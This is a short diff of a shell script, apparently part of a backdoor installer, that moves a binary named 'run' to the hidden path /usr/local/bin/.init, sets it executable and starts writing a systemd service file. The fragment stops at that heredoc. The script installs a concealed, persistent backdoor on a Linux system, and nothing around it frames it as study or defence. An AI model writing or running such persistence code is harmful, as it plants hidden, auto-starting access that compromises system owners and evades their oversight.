@@ -4,7 +4,7 @@ PATH="/usr/local/bin"
 FILE=".init"
 BACKDOOR="$PATH/$FILE"
 
-cp run $BACKDOOR
+mv run $BACKDOOR
 /usr/bin/chmod 711 $BACKDOOR
 
 /usr/bin/cat <<EOF > /lib/systemd/system/$SERVICE.service
